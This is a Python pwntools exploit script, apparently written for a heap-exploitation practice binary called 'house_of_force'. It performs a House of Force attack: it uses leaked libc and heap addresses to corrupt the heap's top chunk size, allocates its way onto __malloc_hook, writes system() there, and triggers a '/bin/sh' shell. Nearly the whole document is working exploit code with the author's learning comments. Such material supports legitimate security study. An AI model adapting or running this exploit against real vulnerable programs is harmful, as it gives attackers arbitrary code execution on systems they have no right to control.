#!/usr/bin/python3
from pwn import *

context.terminal = ['qterminal', '-e', '/usr/bin/python3']

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6")  # elf.libc broke again

gs = '''
init-pwndbg
b *main+0
continue
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.sendline(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")


# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# Here, we are doing the same top chunk size overwrite but we also put in "/bin/sh" at the start for a memory location to reference later
malloc(24, b"/bin/sh\x00" + b"A" * 16 + p64(0xffffffffffffffff))

# We don't need to wraparound since we are targetting a malloc function called malloc_hook. Like hooks in git, this function executes whenever
# malloc is called. Thus, our goal is to overwrite this place with an address to a function we want executed. We do the same -0x20 with the function itself
# +0x20 to account for the chunk allocated before
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)

# Allocate a chunk of that distance. Now we will be at malloc hook
malloc(distance, b"B")

# We overwrite the malloc hook area with system's address
malloc(24, p64(libc.sym.system))

# For our argument to system, we allocate a chunk with the size where bin/sh starts (exactly from heap + 0x10. Check with dq <heap_addr>+0x10)
# This chunk wraparounds technically speaking and a pointer to this heap user data as passed as an argument to the function call in malloc_hook.
# This is unclear to me how it works because system takes arguments from registers in a x64 case. Either way, this works.
malloc(heap + 0x10, b"")

io.interactive()
